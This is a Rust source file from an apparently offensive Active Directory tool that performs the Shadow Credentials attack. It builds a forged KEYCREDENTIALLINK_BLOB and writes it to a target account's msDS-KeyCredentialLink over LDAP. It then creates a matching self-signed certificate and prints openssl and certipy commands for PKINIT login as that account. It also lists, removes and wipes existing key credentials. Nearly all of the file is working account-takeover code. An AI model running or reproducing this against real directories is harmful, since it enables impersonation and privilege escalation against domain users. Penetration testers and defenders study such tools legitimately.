//! Shadow Credentials (Key Trust) actions.
//! Manages the msDS-KeyCredentialLink attribute of an AD account.
//!
//! Attack flow:
//!   1. add_shadow_cred   - generate RSA 2048 key pair, build a
//!                          KEYCREDENTIALLINK_BLOB, add it to the target.
//!                          Saves <target>.crt + <target>.key (PEM).
//!   2. Authenticate with PKINIT using the saved cert+key:
//!        certipy auth -pfx shadow.pfx -dc-ip <dc>
//!        (convert PEM to PFX first:
//!         openssl pkcs12 -export -in <t>.crt -inkey <t>.key -out shadow.pfx -passout pass:)
//!   3. remove_shadow_cred - remove the added entry by DeviceID (--shadow-key-id)
//!   4. list_shadow_cred   - enumerate all KeyCredential entries on a target
//!   5. flush_shadow_cred  - clear all entries (use with care)
//!
//! References:
//!   [MS-ADTS] 2.2.20 KEYCREDENTIALLINK_BLOB
//!   [MS-ADTS] 2.2.20.6 KEYCREDENTIALLINK_ENTRY identifiers
//!   https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/
//!   https://github.com/eladshamir/Whisker (C# reference)
//!   https://github.com/ShutdownRepo/pywhisker (Python reference)

use std::collections::HashSet;
use std::time::{SystemTime, UNIX_EPOCH};

use anyhow::{anyhow, Context, Result};
use ldap3::{Ldap, Mod, Scope, SearchEntry};
use log::{debug, info, trace};
use rand::RngCore;
use rsa::pkcs8::EncodePrivateKey;
use rsa::traits::PublicKeyParts;
use sha2::{Digest, Sha256};

use crate::args::Options;

// [MS-ADTS] attribute holding the Key Trust credentials.
const KEYCRED_ATTR: &str = "msDS-KeyCredentialLink";

// KEYCREDENTIALLINK_ENTRY identifiers ([MS-ADTS] 2.2.20.6)
const ID_KEY_ID:            u8 = 0x01; // 32 bytes - SHA256 of KeyMaterial
const ID_KEY_HASH:          u8 = 0x02; // 32 bytes - SHA256 of all following entries
const ID_KEY_MATERIAL:      u8 = 0x03; // variable - BCRYPT_RSAKEY_BLOB
const ID_KEY_USAGE:         u8 = 0x04; // 1 byte  - 0x01 = NGC (required)
const ID_KEY_SOURCE:        u8 = 0x05; // 1 byte  - 0x00 = AD (required)
const ID_DEVICE_ID:         u8 = 0x06; // 16 bytes - random GUID (user-visible identifier)
const ID_CUSTOM_KEY_INFO:   u8 = 0x07; // 2 bytes - version=0x01, flags=0x00
const ID_KEY_CREATION_TIME: u8 = 0x09; // 8 bytes - FILETIME

// KEY_USAGE_NGC: Next-Generation Credential (standard for shadow credentials).
const KEY_USAGE_NGC: u8 = 0x01;
// KEY_SOURCE_AD: key stored in Active Directory (not AzureAD).
const KEY_SOURCE_AD: u8 = 0x00;

// Encode one blob entry: length (2 LE) || identifier (1) || data.
fn kc_entry(id: u8, data: &[u8]) -> Vec<u8> {
    let mut e = Vec::with_capacity(3 + data.len());
    e.extend_from_slice(&(data.len() as u16).to_le_bytes());
    e.push(id);
    e.extend_from_slice(data);
    e
}

// Current time as a Windows FILETIME (100-ns ticks since 1601-01-01 UTC).
// Offset from Unix epoch: 11 644 473 600 seconds.
fn now_filetime() -> [u8; 8] {
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let filetime: u64 = (secs + 11_644_473_600) * 10_000_000;
    filetime.to_le_bytes()
}

// Encode an RSA public key as a BCRYPT_RSAKEY_BLOB.
// This is the format Windows expects for KeyMaterial (0x03) in
// msDS-KeyCredentialLink. DSInternals (used by Whisker/pywhisker) stores the
// key this way; the DC parses KeyMaterial as a BCRYPT blob, so SPKI DER here
// makes the KDC decode a bogus key and reject PKINIT (CLIENT_NOT_TRUSTED).
//
// Layout (BCRYPT_RSAKEY_BLOB header is little-endian, key data big-endian):
//   Magic:              4 bytes = "RSA1" (0x31415352)
//   BitLength:          4 bytes = key size in bits
//   PublicExponentSize: 4 bytes = byte length of exponent
//   ModulusSize:        4 bytes = byte length of modulus
//   Prime1Size:         4 bytes = 0 (public key only)
//   Prime2Size:         4 bytes = 0 (public key only)
//   PublicExponent:     PublicExponentSize bytes (big-endian)
//   Modulus:            ModulusSize bytes (big-endian)
fn bcrypt_rsa_public_blob(pub_key: &rsa::RsaPublicKey) -> Vec<u8> {
    let n = pub_key.n().to_bytes_be();
    let e = pub_key.e().to_bytes_be();
    let bit_len = (n.len() * 8) as u32;

    trace!("[shadow_cred] BCRYPT blob: bit_len={bit_len} e_len={} n_len={}", e.len(), n.len());

    let mut blob = Vec::with_capacity(24 + e.len() + n.len());
    blob.extend_from_slice(b"RSA1");
    blob.extend_from_slice(&bit_len.to_le_bytes());
    blob.extend_from_slice(&(e.len() as u32).to_le_bytes());
    blob.extend_from_slice(&(n.len() as u32).to_le_bytes());
    blob.extend_from_slice(&0u32.to_le_bytes()); // Prime1Size
    blob.extend_from_slice(&0u32.to_le_bytes()); // Prime2Size
    blob.extend_from_slice(&e);
    blob.extend_from_slice(&n);
    blob
}

// Build the KEYCREDENTIALLINK_BLOB.
//
// key_material: BCRYPT_RSAKEY_BLOB of the enrolled public key.
//   DSInternals / pywhisker store the RSA public key in this Windows-native
//   format, not SPKI DER.
// device_id:    random 16-byte GUID used as the user-visible credential identifier.
//
// Entry ordering matches Whisker / pywhisker:
//   Version (4 bytes LE = 0x00000200)
//   0x01 KeyID:          SHA256(key_material)
//   0x02 KeyHash:        SHA256(all entries following this one)
//   0x03 KeyMaterial:    BCRYPT_RSAKEY_BLOB
//   0x04 KeyUsage:       0x01 (NGC)
//   0x05 KeySource:      0x00 (AD)
//   0x06 DeviceId:       device_id (16 bytes)
//   0x07 CustomKeyInfo:  0x01 0x00
//   0x09 KeyCreationTime: FILETIME
fn build_blob(key_material: &[u8], device_id: &[u8; 16]) -> Vec<u8> {
    // KeyID = SHA256 of key material.
    let key_id = Sha256::digest(key_material);
    trace!("[shadow_cred] KeyID (SHA256 of material): {}", hex::encode(&key_id));

    let creation = now_filetime();

    // Build all entries that come AFTER the KeyHash entry.
    // KeyHash covers their serialised bytes.
    let mut tail: Vec<u8> = Vec::new();
    tail.extend(kc_entry(ID_KEY_MATERIAL,      key_material));
    tail.extend(kc_entry(ID_KEY_USAGE,         &[KEY_USAGE_NGC]));
    tail.extend(kc_entry(ID_KEY_SOURCE,        &[KEY_SOURCE_AD]));
    tail.extend(kc_entry(ID_DEVICE_ID,         device_id));
    tail.extend(kc_entry(ID_CUSTOM_KEY_INFO,   &[0x01, 0x00]));
    tail.extend(kc_entry(ID_KEY_CREATION_TIME, &creation));

    // KeyHash = SHA256 of the serialised following entries.
    let key_hash = Sha256::digest(&tail);
    trace!("[shadow_cred] KeyHash: {}", hex::encode(&key_hash));

    let mut blob: Vec<u8> = Vec::new();
    blob.extend_from_slice(&0x0000_0200u32.to_le_bytes()); // Version
    blob.extend(kc_entry(ID_KEY_ID,   &key_id));           // 0x01
    blob.extend(kc_entry(ID_KEY_HASH, &key_hash));         // 0x02
    blob.extend(tail);                                     // 0x03 ... 0x09
    blob
}

// Encode blob as the LDAP DNWithBinary syntax value:
//   B:<hex_char_count>:<lowercase_hex>:<target_dn>
fn dn_with_binary(blob: &[u8], dn: &str) -> String {
    let hex = hex::encode(blob);
    format!("B:{}:{}:{}", hex.len(), hex, dn)
}

// Blob parser used by list and remove.
struct KeyCredInfo {
    // DeviceId (0x06) - the 16-byte GUID shown to users and used for removal.
    device_id: [u8; 16],
    // KeyCreationTime (0x09)
    creation_time: u64,
}

fn parse_dnwithbinary(val: &str) -> Option<KeyCredInfo> {
    // Format: B:<hexlen>:<hexblob>:<dn>
    let parts: Vec<&str> = val.splitn(4, ':').collect();
    if parts.len() < 4 || parts[0] != "B" {
        return None;
    }
    let blob = hex::decode(parts[2]).ok()?;
    parse_blob_entries(&blob)
}

fn parse_blob_entries(blob: &[u8]) -> Option<KeyCredInfo> {
    if blob.len() < 4 {
        return None;
    }
    let mut pos = 4usize; // skip 4-byte version field
    let mut device_id = [0u8; 16];
    let mut creation_time = 0u64;

    while pos + 3 <= blob.len() {
        let data_len = u16::from_le_bytes([blob[pos], blob[pos + 1]]) as usize;
        let id = blob[pos + 2];
        pos += 3;
        if pos + data_len > blob.len() {
            trace!("[shadow_cred] parse: entry id=0x{id:02x} truncated, stopping");
            break;
        }
        let data = &blob[pos..pos + data_len];
        trace!("[shadow_cred] parse: entry id=0x{id:02x} len={data_len}");
        match id {
            0x06 if data_len == 16 => device_id.copy_from_slice(data),
            0x09 if data_len == 8  => {
                creation_time = u64::from_le_bytes(data.try_into().ok()?);
            }
            _ => {}
        }
        pos += data_len;
    }
    Some(KeyCredInfo { device_id, creation_time })
}

// Convert a Windows FILETIME to a human-readable UTC string.
// Avoids a chrono dependency by doing the Gregorian math inline.
fn filetime_to_utc(ft: u64) -> String {
    let unix_secs = ft / 10_000_000;
    if unix_secs < 11_644_473_600 {
        return "(invalid time)".to_string();
    }
    let secs = unix_secs - 11_644_473_600;
    let s    = secs % 60;
    let m    = (secs / 60) % 60;
    let h    = (secs / 3600) % 24;
    let days = secs / 86400;
    let (y, mo, d) = days_to_ymd(days);
    format!("{y:04}-{mo:02}-{d:02} {h:02}:{m:02}:{s:02} UTC")
}

fn days_to_ymd(mut days: u64) -> (u64, u64, u64) {
    let (n400, r) = (days / 146097, days % 146097);
    days = r;
    let (n100, r) = (days / 36524, days % 36524);
    let (n100, r) = if n100 == 4 { (3, 36524) } else { (n100, r) };
    days = r;
    let (n4, r)   = (days / 1461, days % 1461);
    let (n1, r)   = (r / 365, r % 365);
    let (n1, r)   = if n1 == 4 { (3, 365) } else { (n1, r) };
    let year = n400 * 400 + n100 * 100 + n4 * 4 + n1 + 1970;
    let leap = year % 4 == 0 && (year % 100 != 0 || year % 400 == 0);
    let mdays: [u64; 12] = [31, if leap { 29 } else { 28 }, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut doy   = r;
    let mut month = 1u64;
    for &md in &mdays {
        if doy < md { break; }
        doy  -= md;
        month += 1;
    }
    (year, month, doy + 1)
}

// Windows GUID mixed-endian display.
// Data1 (4 bytes), Data2 (2 bytes), Data3 (2 bytes) are stored little-endian;
// Data4 (8 bytes) is stored big-endian (as-is).
// This matches how pywhisker and Windows tools show DeviceId GUIDs.
fn format_device_guid(b: &[u8; 16]) -> String {
    format!(
        "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        b[3], b[2], b[1], b[0],  // Data1 LE displayed as BE
        b[5], b[4],               // Data2 LE displayed as BE
        b[7], b[6],               // Data3 LE displayed as BE
        b[8],  b[9],              // Data4 as-is
        b[10], b[11], b[12], b[13], b[14], b[15]
    )
}

// Parse a GUID string (with or without braces/dashes) back to the 16-byte
// Windows wire format (Data1/2/3 stored LE, Data4 as-is).
fn parse_device_guid(s: &str) -> Option<[u8; 16]> {
    let s = s.trim().trim_matches(|c| c == '{' || c == '}');
    let clean: String = s.chars().filter(|c| *c != '-').collect();
    if clean.len() != 32 {
        return None;
    }
    let raw: Vec<u8> = (0..16)
        .map(|i| u8::from_str_radix(&clean[i * 2..i * 2 + 2], 16).ok())
        .collect::<Option<_>>()?;
    let mut out = [0u8; 16];
    // Reverse Data1, Data2, Data3 to get wire (LE) form.
    out[0] = raw[3]; out[1] = raw[2]; out[2] = raw[1]; out[3] = raw[0];
    out[4] = raw[5]; out[5] = raw[4];
    out[6] = raw[7]; out[7] = raw[6];
    out[8..].copy_from_slice(&raw[8..]);
    Some(out)
}

fn base_dn(domain: &str) -> String {
    domain.split('.').map(|p| format!("dc={p}")).collect::<Vec<_>>().join(",")
}

// Resolve a sAMAccountName (or CN) to its full DN.
// Accepts computer accounts with or without the trailing '$'.
async fn find_target_dn(ldap: &mut Ldap, base: &str, sam: &str) -> Result<String> {
    let sam_dollar_str = format!("{sam}$");
    let sam_exact  = ldap3::ldap_escape(sam);
    let sam_dollar = ldap3::ldap_escape(&sam_dollar_str);
    let cn_val     = ldap3::ldap_escape(sam);

    let filter = format!(
        "(|(sAMAccountName={sam_exact})(sAMAccountName={sam_dollar})(cn={cn_val}))"
    );
    debug!("[shadow_cred] find_target_dn filter: {filter}");

    let (rs, _) = ldap
        .search(base, Scope::Subtree, &filter, vec!["dn"])
        .await?
        .success()?;
    let entry = rs
        .into_iter()
        .next()
        .ok_or_else(|| anyhow!("object '{sam}' not found"))?;
    let dn = SearchEntry::construct(entry).dn;
    debug!("[shadow_cred] resolved DN: {dn}");
    Ok(dn)
}

// Read all msDS-KeyCredentialLink values from a target DN.
//
// This attribute has DNWithBinary syntax. Depending on the server and the TLS
// stack, ldap3 may return its values as UTF-8 strings (in `attrs`) or as raw
// bytes (in `bin_attrs`). We read both so list/remove/flush always see the
// credentials that add wrote.
async fn read_keycred_values(ldap: &mut Ldap, target_dn: &str) -> Result<Vec<String>> {
    debug!("[shadow_cred] reading {KEYCRED_ATTR} from {target_dn}");
    let (rs, _) = ldap
        .search(target_dn, Scope::Base, "(objectClass=*)", vec![KEYCRED_ATTR])
        .await?
        .success()?;
    let entry = rs
        .into_iter()
        .next()
        .ok_or_else(|| anyhow!("could not read target object"))?;
    let se = SearchEntry::construct(entry);

    let mut vals: Vec<String> = se.attrs.get(KEYCRED_ATTR).cloned().unwrap_or_default();

    // Also pull values returned as raw bytes (DNWithBinary is ASCII text:
    // "B:<len>:<hex>:<dn>", so a lossy UTF-8 conversion is safe here).
    if let Some(bin) = se.bin_attrs.get(KEYCRED_ATTR) {
        for b in bin {
            vals.push(String::from_utf8_lossy(b).into_owned());
        }
    }

    debug!(
        "[shadow_cred] found {} existing KeyCredential value(s) ({} text, {} binary)",
        vals.len(),
        se.attrs.get(KEYCRED_ATTR).map(|v| v.len()).unwrap_or(0),
        se.bin_attrs.get(KEYCRED_ATTR).map(|v| v.len()).unwrap_or(0),
    );
    Ok(vals)
}

// Public actions

/// List all shadow credentials enrolled on a target account.
pub async fn list(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts
        .shadow_target
        .as_deref()
        .ok_or_else(|| anyhow!("--shadow-target required"))?;
    let base      = base_dn(&opts.domain);
    let target_dn = find_target_dn(ldap, &base, target).await?;
    let values    = read_keycred_values(ldap, &target_dn).await?;

    if values.is_empty() {
        info!("[*] No shadow credentials on '{target}'");
    } else {
        info!("[*] {} shadow credential(s) on '{target}':", values.len());
        for (i, v) in values.iter().enumerate() {
            if let Some(kc) = parse_dnwithbinary(v) {
                info!(
                    "    [{i}] DeviceID: {}  |  Created: {}",
                    format_device_guid(&kc.device_id),
                    filetime_to_utc(kc.creation_time)
                );
            } else {
                info!("    [{i}] (unparseable entry)");
            }
        }
    }
    Ok(())
}

/// Add a shadow credential to a target account.
///
/// Generates an RSA 2048 key pair (required by Certipy v5+ for PKINIT),
/// builds a KEYCREDENTIALLINK_BLOB with the correct MS-ADTS identifiers,
/// adds it to msDS-KeyCredentialLink, and saves <target>.crt + <target>.key.
pub async fn add(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts
        .shadow_target
        .as_deref()
        .ok_or_else(|| anyhow!("--shadow-target required"))?;
    let base      = base_dn(&opts.domain);
    let target_dn = find_target_dn(ldap, &base, target).await?;

    // Generate RSA 2048 key pair.
    // Certipy v5+ requires RSA for PKINIT.
    debug!("[shadow_cred] generating RSA 2048 key pair");
    let private_key = rsa::RsaPrivateKey::new(&mut rand::thread_rng(), 2048)
        .context("RSA 2048 key generation failed")?;

    // KeyMaterial (0x03) must be a BCRYPT_RSAKEY_BLOB, the Windows-native format
    // DSInternals/pywhisker use. SPKI DER makes the KDC reject PKINIT
    // (KDC_ERROR_CLIENT_NOT_TRUSTED).
    let key_material = bcrypt_rsa_public_blob(&private_key.to_public_key());
    debug!("[shadow_cred] BCRYPT_RSAKEY_BLOB len={}", key_material.len());

    // Generate random 16-byte DeviceID (user-visible identifier for removal).
    let mut device_id = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut device_id);
    debug!("[shadow_cred] DeviceID: {}", hex::encode(device_id));

    // Build KEYCREDENTIALLINK_BLOB and encode as DNWithBinary.
    let blob  = build_blob(&key_material, &device_id);
    let value = dn_with_binary(&blob, &target_dn);
    trace!("[shadow_cred] DNWithBinary value len={}", value.len());

    // Add to LDAP using Mod::Add so existing credentials are preserved.
    debug!("[shadow_cred] writing {KEYCRED_ATTR} on {target_dn}");
    ldap.modify(
        &target_dn,
        vec![Mod::Add(
            KEYCRED_ATTR.as_bytes().to_vec(),
            HashSet::from([value.into_bytes()]),
        )],
    )
    .await?
    .success()
    .map_err(|e| anyhow!("add_shadow_cred LDAP modify failed: {e}"))?;

    info!("[+] Shadow credential added to '{target}'");
    info!("    DeviceID: {}", format_device_guid(&device_id));

    // Generate self-signed certificate for PKINIT authentication.
    // The cert's SubjectPublicKeyInfo carries the same RSA key as key_material above.
    debug!("[shadow_cred] generating self-signed certificate");

    // PKCS#8 PEM for rcgen import (rcgen 0.13 exposes from_pem, not from_der).
    let pkcs8_pem = private_key
        .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
        .context("RSA PKCS#8 PEM encoding failed")?;
    let key_pair = rcgen::KeyPair::from_pem(pkcs8_pem.as_str())
        .context("RSA key import into rcgen failed")?;

    let mut cert_params = rcgen::CertificateParams::default();
    cert_params
        .distinguished_name
        .push(rcgen::DnType::CommonName, target);

    // pywhisker sets notBefore/notAfter to ±40 years to avoid clock skew issues.
    // rcgen stores times as OffsetDateTime (from the `time` crate).
    // 40 * 365 * 86400 = 1_262_304_000 seconds (close enough, ignoring leap years).
    const FORTY_YEARS_SECS: i64 = 40 * 365 * 86_400;
    let now = time::OffsetDateTime::now_utc();
    cert_params.not_before = now - time::Duration::seconds(FORTY_YEARS_SECS);
    cert_params.not_after  = now + time::Duration::seconds(FORTY_YEARS_SECS);

    // Add UPN as SubjectAltName OtherName so the KDC can map the PKINIT
    // request to the target account (required, else "Name mismatch").
    // rcgen 0.13 supports OtherName natively via SanType::OtherName, which is
    // emitted correctly (a hand-rolled CustomExtension on OID 2.5.29.17 gets
    // deduplicated by rcgen and silently dropped).
    // OID 1.3.6.1.4.1.311.20.2.3 = szOID_NT_PRINCIPAL_NAME (UPN).
    let upn = format!("{target}@{}", opts.domain.to_lowercase());
    debug!("[shadow_cred] UPN SAN: {upn}");
    cert_params.subject_alt_names.push(rcgen::SanType::OtherName((
        vec![1u64, 3, 6, 1, 4, 1, 311, 20, 2, 3],
        rcgen::OtherNameValue::Utf8String(upn),
    )));

    let cert = cert_params
        .self_signed(&key_pair)
        .context("self-signed certificate generation failed")?;

    // Sanitize the target name for use as a filename.
    let safe_name = target.to_lowercase().replace([' ', '\\', '/', '$'], "_");
    let crt_path  = format!("{safe_name}.crt");
    let key_path  = format!("{safe_name}.key");

    std::fs::write(&crt_path, cert.pem())
        .with_context(|| format!("writing {crt_path}"))?;
    std::fs::write(&key_path, key_pair.serialize_pem())
        .with_context(|| format!("writing {key_path}"))?;

    info!("[*] Certificate written to '{crt_path}'");
    info!("[*] Private key  written to '{key_path}'");
    info!("[*] Convert to PFX then authenticate:");
    info!("      openssl pkcs12 -export -in {crt_path} -inkey {key_path} -out {safe_name}.pfx -passout pass:");
    info!("      certipy auth -pfx {safe_name}.pfx -dc-ip <dc_ip> -domain {} -username {target}", opts.domain);
    info!("[*] To clean up: remove_shadow_cred {target} {}", format_device_guid(&device_id));

    Ok(())
}

/// Remove the shadow credential identified by --shadow-key-id (DeviceID hex).
/// The DeviceID is shown by list_shadow_cred and add_shadow_cred.
pub async fn remove(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts
        .shadow_target
        .as_deref()
        .ok_or_else(|| anyhow!("--shadow-target required"))?;
    let device_id_hex = opts
        .shadow_key_id
        .as_deref()
        .ok_or_else(|| anyhow!("--shadow-key-id required (DeviceID from list_shadow_cred)"))?;

    // Accept both raw hex (32 chars) and GUID format (with dashes/braces).
    let wanted = parse_device_guid(device_id_hex)
        .ok_or_else(|| anyhow!("invalid DeviceID '{device_id_hex}': expected GUID format (e.g. 9c8d7e6f-5a4b-3c2d-1e0f-abcdef012345) or 32 hex chars"))?;

    let base      = base_dn(&opts.domain);
    let target_dn = find_target_dn(ldap, &base, target).await?;
    let values    = read_keycred_values(ldap, &target_dn).await?;

    if values.is_empty() {
        info!("[*] No shadow credentials on '{target}', nothing to remove");
        return Ok(());
    }

    let (keep, removed): (Vec<_>, Vec<_>) = values.iter().partition(|v| {
        parse_dnwithbinary(v)
            .map(|kc| {
                trace!("[shadow_cred] comparing DeviceID {} vs {device_id_hex}", format_device_guid(&kc.device_id));
                kc.device_id != wanted
            })
            .unwrap_or(true)
    });

    debug!("[shadow_cred] keeping {} entry(ies), removing {}", keep.len(), removed.len());

    if removed.is_empty() {
        return Err(anyhow!(
            "DeviceID '{device_id_hex}' not found on '{target}', run list_shadow_cred to check"
        ));
    }
    let kept_bytes: HashSet<Vec<u8>> = keep
        .into_iter()
        .map(|v| v.as_bytes().to_vec())
        .collect();

    ldap.modify(
        &target_dn,
        vec![Mod::Replace(KEYCRED_ATTR.as_bytes().to_vec(), kept_bytes)],
    )
    .await?
    .success()
    .map_err(|e| anyhow!("remove_shadow_cred LDAP modify failed: {e}"))?;

    info!("[+] Shadow credential '{device_id_hex}' removed from '{target}'");
    Ok(())
}

/// Clear ALL shadow credentials from a target account.
/// Prefer remove_shadow_cred with an explicit DeviceID for surgical cleanup.
pub async fn flush(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts
        .shadow_target
        .as_deref()
        .ok_or_else(|| anyhow!("--shadow-target required"))?;
    let base      = base_dn(&opts.domain);
    let target_dn = find_target_dn(ldap, &base, target).await?;

    debug!("[shadow_cred] flushing all {KEYCRED_ATTR} on {target_dn}");
    ldap.modify(
        &target_dn,
        vec![Mod::Replace(
            KEYCRED_ATTR.as_bytes().to_vec(),
            HashSet::<Vec<u8>>::new(),
        )],
    )
    .await?
    .success()
    .map_err(|e| anyhow!("flush_shadow_cred LDAP modify failed: {e}"))?;

    info!("[+] All shadow credentials cleared from '{target}'");
    Ok(())
}